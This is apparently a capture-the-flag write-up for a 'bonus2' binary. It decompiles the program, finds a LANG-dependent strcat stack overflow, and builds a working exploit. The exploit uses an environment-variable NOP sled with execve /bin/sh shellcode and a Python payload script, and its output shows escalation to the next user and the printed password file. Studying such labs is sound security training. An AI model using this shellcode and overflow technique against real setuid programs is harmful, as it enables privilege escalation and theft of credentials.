# bonus2

Tinkering with the binary :
```sh
$ ./bonus2
$ echo $?
1
$ ./bonus2 "" ""
Hello
$ ltrace ./bonus2
__libc_start_main(...)
+++ exited (status 1) +++
$ ltrace ./bonus2 1
__libc_start_main(...)
+++ exited (status 1) +++
$ ltrace ./bonus2 1 2
__libc_start_main(0x8048529, 3, 0xbffff7f4, 0x8048640, 0x80486b0 <unfinished ...>
strncpy(0xbffff700, "1", 40) # Concats a maximum of 40 characters from argv[1]
strncpy(0xbffff728, "2", 32) # Concats a maximum of 32 characters from argv[2]
getenv("LANG")               # Checks the LANG environment variable
strcat("Hello ", "1")        # Concatenates "Hello " with argv[1]
puts("Hello 1"Hello 1)
+++ exited (status 8) +++
```

Diassembling the binary using `ghidra` :

```c
int language = 0;

void greetuser(char *name)
{
    char buffer[64];

    switch (language) {
        case 1:
            strcpy(buffer, "Hyv\x3d\x5c\xc3\xa4\xc3\xa4\x20\x70\xc3\xa4\x59\xc3\xa4\xc3\x76\x20\xa4\x00");
            break;
        case 2:
            strcpy(buffer, "Goedemiddag!\x20");
            break;
        case 0:
            strcpy(buffer, "Hello ");
            break;
    }
    strcat(buffer, name);
    puts(buffer);
}

int main(int argc, char **argv)
{
    char buffer[72] = {0};
    char *envLang;

    if (argc != 3)
        return (1);

    strncpy(buffer, argv[1], 40);
    strncpy(buffer + 40, argv[2], 32);
    envLang = getenv("LANG");
    if (envLang != 0) {
        if (memcmp(envLang, "fi", 2) == 0)
            language = 1;
        else if (memcmp(envLang, "nl", 2) == 0)
            language = 2;
    }
    greetuser(buffer);
    return (0);
}
```

Let's try to overflow any of the buffers using all combinations of `LANG`.

## LANG undefined

```sh
$ gdb ./bonus2
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
```

It seems like we only were able to overwrite two bytes of `$eip`.

## LANG=fi

```sh
$ LANG=fi gdb ./bonus2
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

## LANG=nl

```sh
$ LANG=nl gdb ./bonus2
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

So it seems like `nl` or `fi` will do the job.

Let's find the offset.

```sh
$ export LANG=nl
$ gdb ./bonus2
gef➤ pattern create
[+] Generating a pattern of 1024 bytes (n=4)
[+] Saved as `$_gef0`
r <pattern> <pattern>
Hyvää päivää aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaaaaabaaacaaadaaaeaaafaaagaaahaaa

Program received signal SIGSEGV, Segmentation fault.
0x61666161 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x5b      
$ebx   : 0xffffc740  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaaaaabaaaca[...]"
$ecx   : 0xf7f9b9b4  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffc6f0  →  "aagaaahaaa"
$ebp   : 0x61656161 ("aaea"?)
$esi   : 0xffffc78c  →  0xffffd45a  →  0x58006966 ("fi"?)
$edi   : 0xffffc73c  →  0xf7fc66d0  →  0x0000000e
$eip   : 0x61666161 ("aafa"?)
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────── stack ────
0xffffc6f0│+0x0000: "aagaaahaaa"	 ← $esp
0xffffc6f4│+0x0004: "aahaaa"
0xffffc6f8│+0x0008: 0x61006161 ("aa"?)
0xffffc6fc│+0x000c: "daaaeaaafaaagaaahaaaiaaajaaaaaaabaaacaaadaaaeaaafa[...]"
0xffffc700│+0x0010: "eaaafaaagaaahaaaiaaajaaaaaaabaaacaaadaaaeaaafaaaga[...]"
0xffffc704│+0x0014: "faaagaaahaaaiaaajaaaaaaabaaacaaadaaaeaaafaaagaaaha[...]"
0xffffc708│+0x0018: "gaaahaaaiaaajaaaaaaabaaacaaadaaaeaaafaaagaaahaaa"
0xffffc70c│+0x001c: "haaaiaaajaaaaaaabaaacaaadaaaeaaafaaagaaahaaa"
───────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61666161
───────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bonus2", stopped 0x61666161 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────
gef➤ pattern search $eip
[+] Searching for '61616661'/'61666161' with period=4
[+] Found at offset 18 (little-endian search) likely
```

Same as before, since there are no tools we can use to jump to a `system` call or whatever, we will have to use a shellcode.

We will again use a (NOP sled)[https://en.wikipedia.org/wiki/NOP_slide] to facilitate the exploitation.

```python
export SHELLCODE=$(python -c 'print "\x90"*100')$(echo -en "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
```

We will need to get the address of our shellcode :

```sh
cat << EOF > /tmp/getaddr.c
int main(int argc, char **argv, char **envp) {
    printf("shellcode @ %p\n", getenv("SHELLCODE"));
}
EOF
gcc -o /tmp/getaddr /tmp/getaddr.c
/tmp/getaddr
shellcode @ 0xbffff8ac
```

Building the payload :

```py
import struct
import sys

if len(sys.argv) == 1:
    print "A" * 40 # Fill the first 40 bytes buffer
else:
    payload = "B" * 23 # Offset with LANG=nl
    payload += struct.pack("I", 0xbffff8ac)
    print payload
```

Usage :

```sh
$ cat - | ./bonus2 $(python /tmp/payload.py) $(python /tmp/payload.py 2)
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
id
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```